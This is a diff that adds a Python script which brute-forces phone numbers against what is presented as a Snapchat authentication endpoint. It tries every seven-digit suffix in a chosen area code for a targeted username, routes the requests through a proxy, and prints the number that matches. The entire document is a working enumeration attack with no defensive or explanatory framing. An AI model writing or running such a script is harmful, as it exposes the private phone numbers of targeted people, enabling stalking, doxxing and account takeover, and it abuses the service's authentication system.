@@ -1,0 +1,24 @@
+import requests
+import itertools
+import string
+
+session = requests.Session()
+proxies = {'http': 'http://proxy:port'}
+
+def check_phone(username, phone):
+    data = {
+        "username": username,
+        "phone_number": f"+1{phone}",
+        "action": "verify"
+    }
+    resp = session.post("https://sc-auth.snapchat.com/loq/add_phone", 
+                       json=data, proxies=proxies)
+    return "valid" in resp.text.lower()
+
+# Generate US 10-digit (area code targeted)
+area = "555"  # Target area
+for suffix in itertools.product(string.digits, repeat=7):
+    phone = area + ''.join(suffix)
+    if check_phone("target_snap", phone):
+        print(f"Hit: +1{phone}")
+        break
